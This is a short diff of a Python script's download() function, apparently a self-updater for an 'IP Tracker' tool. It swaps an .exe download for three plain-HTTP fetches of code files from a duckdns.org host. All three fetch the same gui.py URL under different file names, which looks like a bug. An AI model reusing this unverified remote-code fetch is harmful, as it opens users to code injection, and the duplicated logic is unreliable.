@@ -14,7 +14,9 @@ def ApplyButton():
     root.destroy()
 
 def download():
-    urlretrieve("http://softwareupdt.duckdns.org:8080/ip_tracker/IP-Tracker_setup.exe", "installer.exe")
+    urlretrieve("http://softwareupdt.duckdns.org:8080/ip_tracker/gui.py", "gui.py")
+    urlretrieve("http://softwareupdt.duckdns.org:8080/ip_tracker/gui.py", "functions.py")
+    urlretrieve("http://softwareupdt.duckdns.org:8080/ip_tracker/gui.py", "main.py")
     root.destroy()
 
 try:
